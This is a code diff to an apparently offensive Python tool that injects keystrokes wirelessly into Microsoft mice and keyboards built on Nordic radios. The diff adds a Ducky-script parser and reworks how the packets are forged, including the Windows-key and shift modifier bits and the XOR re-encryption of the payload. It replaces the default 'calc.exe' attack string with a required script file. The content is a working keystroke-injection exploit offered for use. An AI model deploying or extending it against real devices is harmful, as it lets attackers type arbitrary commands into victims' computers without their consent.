@@ -23,6 +23,168 @@ GR = '\033[37m'  # gray
 
 enable_debug = False
 
+class DuckyParser:
+    hid_map = {
+        4: ['a', 'A'],
+        5: ['b', 'B'],
+        6: ['c', 'C'],
+        7: ['d', 'D'],
+        8: ['e', 'E'],
+        9: ['f', 'F'],
+        10: ['g', 'G'],
+        11: ['h', 'H'],
+        12: ['i', 'I'],
+        13: ['j', 'J'],
+        14: ['k', 'K'],
+        15: ['l', 'L'],
+        16: ['m', 'M'],
+        17: ['n', 'N'],
+        18: ['o', 'O'],
+        19: ['p', 'P'],
+        20: ['q', 'Q'],
+        21: ['r', 'R'],
+        22: ['s', 'S'],
+        23: ['t', 'T'],
+        24: ['u', 'U'],
+        25: ['v', 'V'],
+        26: ['w', 'W'],
+        27: ['x', 'X'],
+        28: ['y', 'Y'],
+        29: ['z', 'Z'],
+        30: ['1', '!'],
+        31: ['2', '@'],
+        32: ['3', '#'],
+        33: ['4', '$'],
+        34: ['5', '%'],
+        35: ['6', '^'],
+        36: ['7', '&'],
+        37: ['8', '*'],
+        38: ['9', '('],
+        39: ['0', ')'],
+        40: ['ENTER', 'ENTER'],
+        41: ['ESC', 'ESC'],
+        42: ['DELETE', 'DELETE'],
+        43: ['TAB', 'TAB'],
+        44: ['SPACE', 'SPACE'],
+        45: ['-', '_'],
+        46: ['=', '+'],
+        47: ['[', '{'],
+        48: [']', '}'],
+        49: ['\\', '|'],
+        51: [';', ':'],
+        52: ['\'', '"'],
+        53: ['`', '~'],
+        55: ['.', '>'],
+        56: ['/', '?'],
+        57: ['CAPSLOCK', 'CAPSLOCK'],
+        58: ['F1', 'F1'],
+        59: ['F2', 'F2'],
+        60: ['F3', 'F3'],
+        61: ['F4', 'F4'],
+        62: ['F5', 'F5'],
+        63: ['F6', 'F6'],
+        64: ['F7', 'F7'],
+        65: ['F8', 'F8'],
+        66: ['F9', 'F9'],
+        67: ['F10', 'F10'],
+        68: ['F11', 'F11'],
+        69: ['F12', 'F12'],
+        70: ['PRINTSCREEN', 'PRINTSCREEN'],
+        71: ['SCROLLLOCK', 'SCROLLLOCK'],
+        72: ['PAUSE', 'PAUSE'],
+        73: ['INSERT', 'INSERT'],
+        74: ['HOME', 'HOME'],
+        75: ['PAGEUP', 'PAGEUP'],
+        76: ['DEL', 'DEL'],
+        77: ['END', 'END'],
+        78: ['PAGEDOWN', 'PAGEDOWN'],
+        79: ['RIGHT', 'RIGHT'],
+        80: ['LEFT', 'LEFT'],
+        81: ['DOWN', 'DOWN'],
+        82: ['UP', 'UP'],
+    }
+
+    blank_entry = {
+        "meta": False,
+        "shift": False,
+        "alt": False,
+        "ctrl": False,
+        "hid": 0,
+        "char": '',
+        "sleep": 0
+    }
+        
+    def __init__(self, attack_script):
+        self.script = attack_script.split("\n")
+
+    def char_to_hid(self, char):
+        for k, v in self.hid_map.iteritems():
+            if v[0] == char:
+                return k, False
+            elif v[1] == char:
+                return k, True
+
+    def parse(self):
+        entries = []
+        for line in self.script:
+            if line.startswith('ALT'):
+                entry = self.blank_entry.copy()
+                entry['alt'] = True
+                entry['char'] = line.split()[1]
+                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
+                entries.append(entry)
+
+            elif line.startswith("GUI") or line.startswith('WINDOWS') or line.startswith('COMMAND'):
+                entry = self.blank_entry.copy()
+                entry['meta'] = True
+                entry['char'] = line.split()[1]
+                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
+                entries.append(entry)
+
+            elif line.startswith('CTRL') or line.startswith('CONTROL'):
+                entry = self.blank_entry.copy()
+                entry['ctrl'] = True
+                entry['char'] = line.split()[1]
+                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
+                entries.append(entry)
+
+            elif line.startswith('SHIFT'):
+                entry = self.blank_entry.copy()
+                entry['shift'] = True
+                entry['char'] = line.split()[1]
+                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
+                entries.append(entry)
+
+            elif line.startswith("ESC") or line.startswith('APP') or line.startswith('ESCAPE'):
+                entry = self.blank_entry.copy()
+                entry['char'] = "ESC"
+                entry['hid'], entry['shift'] = self.char_to_hid('ESC')
+                entries.append(entry)
+
+            elif line.startswith("DELAY"):
+                entry = self.blank_entry.copy()
+                entry['sleep'] = line.split()[1]
+                entries.append(entry)
+
+            elif line.startswith("STRING"):
+                for char in " ".join(line.split()[1:]):
+                    entry = self.blank_entry.copy()
+                    entry['char'] = char
+                    entry['hid'], entry['shift'] = self.char_to_hid(char)
+                    entries.append(entry)
+
+            elif line.startswith("ENTER"):
+                entry = self.blank_entry.copy()
+                entry['char'] = "\n"
+                entry['hid'], entry['shift'] = self.char_to_hid('ENTER')
+                entries.append(entry)
+            elif len(line) == 0:
+                pass
+            else:
+                print "CAN'T PROCESS... %s" % line
+        
+        return entries
+
 
 class NordicScanner:
 
@@ -89,78 +251,6 @@ class NordicScanner:
 
 
 class NordicGenericHID:
-    hid_map = {
-        0x04:  ['a','A'],
-        0x05:  ['b','B'],
-        0x06:  ['c','C'],
-        0x07:  ['d','D'],
-        0x08:  ['e','E'],
-        0x09:  ['f','F'],
-        0x0A:  ['g','G'],
-        0x0B:  ['h','H'],
-        0x0C:  ['i','I'],
-        0x0D:  ['j','J'],
-        0x0E:  ['k','K'],
-        0x0F:  ['l','L'],
-        0x10:  ['m','M'],
-        0x11:  ['n','N'],
-        0x12:  ['o','O'],
-        0x13:  ['p','P'],
-        0x14:  ['q','Q'],
-        0x15:  ['r','R'],
-        0x16:  ['s','S'],
-        0x17:  ['t','T'],
-        0x18:  ['u','U'],
-        0x19:  ['v','V'],
-        0x1A:  ['w','W'],
-        0x1B:  ['x','X'],
-        0x1C:  ['y','Y'],
-        0x1D:  ['z','Z'],
-        0x1E:  ['1','!'],
-        0x1F:  ['2','@'],
-        0x20:  ['3','#'],
-        0x21:  ['4','$'],
-        0x22:  ['5','%'],
-        0x23:  ['6','^'],
-        0x24:  ['7','&'],
-        0x25:  ['8','*'],
-        0x26:  ['9','('],
-        0x27:  ['0',')'],
-        0x28:  ['\n','\n'],
-        0x29:  ['[ESC]', '[ESC]'],
-        0x2A:  ['[BKSP]', '[BKSP]'],
-        0x2B:  ['\t','\t'],
-        0x2C:  [' ',' '],
-        0x2D:  ['-','_'],
-        0x2E:  ['=','+'],
-        0x2F:  ['[','{'],
-        0x30:  [']','}'],
-        0x31:  ['\\','|'],
-        0x32:  ['#','-'],
-        0x33:  [';',':'],
-        0x34:  ['\'','"'],
-        0x35:  ['`','~'],
-        0x36:  [',','<'],
-        0x37:  ['.','>'],
-        0x38:  ['/','?'],
-        0x39:  ['[CAPS]', '[CAPS]'],
-        0x3A:  ['[F1]', '[F1]'],
-        0x3B:  ['[F2]', '[F2]'],
-        0x3C:  ['[F3]', '[F3]'],
-        0x3D:  ['[F4]', '[F4]'],
-        0x3E:  ['[F5]', '[F5]'],
-        0x3F:  ['[F6]', '[F6]'],
-        0x40:  ['[F7]', '[F7]'],
-        0x41:  ['[F8]', '[F8]'],
-        0x42:  ['[F9]', '[F9]'],
-        0x43:  ['[F10]', '[F10]'],
-        0x44:  ['[F11]', '[F11]'],
-        0x45:  ['[F12]', '[F12]'],
-        0x46:  ['[PrintScr]', '[PrintScr]'],
-        0x47:  ['[ScrollLock]','[ScrollLock]'],
-        0x48:  ['[NumLock]','[NumLock]']
-        # ...etc. There are more on http://www.freebsddiary.org/APC/usb_hid_usages.php
-    }
 
     def __init__(self, radio, address, payload):
         self.radio = radio
@@ -194,15 +284,6 @@ class NordicGenericHID:
     def serialize_payload(self, p):
         return str(bytearray(p))
 
-    def hid_decode(hid, meta):
-        if key in self.hid_map:
-            shift = 0
-            if meta & 0x22:
-                shift = 1
-            return self.hid_map[key][shift]
-        else:
-            return ''
-
     def checksum(self):
         self.payload[-1] = 0
         for i in range(0, len(self.payload) - 1):
@@ -219,92 +300,68 @@ class NordicGenericHID:
     def set_key(self, key):
         raise NotImplementedError('Not implemented in generic HID')
 
+    def clear_payload(self):
+        raise NotImplementedError('Not implemented in generic HID')
+
     def post_keystroke_delay(self):
         pass
 
-    def transmit(self, c=''):
-        self.set_key(c)
-        self.raw_transmit()
+    def send_key(self, c=None):
+        if not c:
+            self.clear_payload()
+            self.transmit()
+        else:
+            self.set_key(c)
+            self.transmit()
 
-    def raw_transmit(self):
+    def transmit(self):
         self.inc_sequence()
         self.checksum()
+        print repr(self.payload)
         self.radio.transmit_payload(self.serialize_payload(self.payload), self.ack_timeout, self.retries)
         self.post_keystroke_delay()
 
     def send_attack(self, attack):
         for _ in range(5):
-            self.transmit()
+            self.send_key()
 
-        self.send_run()
-        with click.progressbar(attack) as bar:
-            for c in bar:
-                self.transmit(c)
-                self.transmit()
+        for c in attack:
+            if c['hid']:
+                self.send_key(c)
+                self.send_key()
+            elif c['sleep']:
+                time.sleep(int(c['sleep']) / 1000)
         
-        self.transmit()
-
-    def set_run_key(self):
-        raise NotImplementedError('Not implemented in generic HID')
-
-    def send_run(self):
-        self.set_run_key()
-        self.raw_transmit()
-        self.transmit()
-        time.sleep(0.2)
+        self.send_key()
 
 
 class MicrosoftMouseDefaultHID(NordicGenericHID):
     def configure(self):
         self.device_type = 'Microsoft Mouse'
         self.payload = self.payload.tolist()
-        # clear sequence number
         self.payload[4:6] = [0, 0]
-        # clear frame contents
+        self.payload[6] = 67
+        self.clear_payload()
+
+    def clear_payload(self):
         self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
 
     def set_key(self, key):
-        # device type = keyboard
-        self.payload[6] = 67
-        # clear second to last byte
-        self.payload[17] = 0
-
-        # special handling to indicate null transmit (reset key state)
-        if key == '':
-            self.payload[7] = 0
-            self.payload[9] = 0
-            return
-
-        # now send key, with shift if necessary
-        for k, v in self.hid_map.iteritems():
-            if v[0] == key:
-                # clear special keys
-                self.payload[7] = 0
-                self.payload[9] = k
-                return
-            elif v[1] == key:
-                # hold shift
-                self.payload[7] = 2
-                self.payload[9] = k
-                return
-
-    def set_run_key(self):
-        self.payload[6] = 67
-        self.payload[17] = 0
-        self.payload[7] = 0x08
-        self.payload[9] = 0x15
-
+        self.payload[7] = 0
+        self.payload[9] = key['hid']
+        if key['meta']:
+            self.payload[7] |= 0x08
+        if key['shift']:
+            self.payload[7] |= 0x02
 
 class MicrosoftMouseEncryptHID(MicrosoftMouseDefaultHID):
     def configure(self):
         self.device_type = 'Microsoft Mouse XOR-Encrypted'
-        # first decrypt the packet
         self.payload = self.xor_crypt(self.payload)
         self.payload = self.payload.tolist()
-        # clear sequence number
         self.payload[4:6] = [0, 0]
-        # clear frame contents
-        self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+        self.payload[6] = 67
+        self.clear_payload()
 
     def serialize_payload(self, p):
         # re-encrypt before transmission
@@ -318,42 +375,22 @@ class MicrosoftMouseEncryptHID(MicrosoftMouseDefaultHID):
 class MicrosoftKeyboardEncryptHID(MicrosoftMouseEncryptHID):
     def configure(self):
         self.device_type = 'Microsoft Keyboard XOR-Encrypted'
-        # first decrypt the packet
         self.payload = self.xor_crypt(self.payload)
         self.payload = self.payload.tolist()
-        # clear sequence number
         self.payload[4:6] = [0, 0]
-        # clear frame contents
+        self.payload[6] = 67
+        self.clear_payload()
+    
+    def clear_payload(self):
         self.payload[7:15] = [0, 0, 0, 0, 0, 0, 0, 0]
 
     def set_key(self, key):
-        # clear second to last byte
-        self.payload[14] = 0
-
-        # special handling to indicate null transmit (reset key state)
-        if key == '':
-            self.payload[7] = 0
-            self.payload[9] = 0
-            return
-
-        # now send key, with shift if necessary
-        for k, v in self.hid_map.iteritems():
-            if v[0] == key:
-                # clear special keys
-                self.payload[7] = 0
-                self.payload[9] = k
-                return
-            elif v[1] == key:
-                # hold shift
-                self.payload[7] = 32
-                self.payload[9] = k
-                return
-
-    def set_run_key(self):
-        self.payload[6] = 67
-        self.payload[14] = 0
-        self.payload[7] = 0x08
-        self.payload[9] = 0x15
+        self.payload[7] = 0
+        self.payload[9] = key['hid']
+        if key['meta']:
+            self.payload[7] |= 0x08
+        if key['shift']:
+            self.payload[7] |= 0x20
 
 
 def fingerprint_device(r, a, p):
@@ -376,12 +413,10 @@ def _debug(debug, text):
 
 @click.command()
 @click.option('--debug', is_flag=True, help='Enable debug.')
-@click.option('--attack', default="calc.exe\n", help="String to use for the attack")
-@click.option('--attackfile', default="", type=click.Path())
-@click.option('--scriptfile', default="", type=click.Path())
+@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
 @click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
-def cli(debug, attack, lowpower, interval, attackfile, scriptfile):
+def cli(debug, script, lowpower, interval):
 
     print """
      ____.              __   .___  __   
@@ -398,14 +433,16 @@ def cli(debug, attack, lowpower, interval, attackfile, scriptfile):
     if debug:
         print O + "[W] " + W + "Debug is enabled"
 
-    if attackfile == "":
-        attack = attack.decode('string_escape')
+    if script == "":
+        print R + '[!] ' + W + "You must supply a ducky script using --script <filename>"
+        exit(-1)
     else:
-        f = open(attackfile,'r')
-        attack = f.read()
-
-    _debug(debug,"Attack is: " + attack.encode('string_escape'))
+        f = open(script,'r')
+        parser = DuckyParser(f.read())
+        attack = parser.parse()
     
+    print repr(attack)
+
     #make sure we are root
     if os.getuid() != 0:
         print R + "[!] " + W + "You need to run as root!"
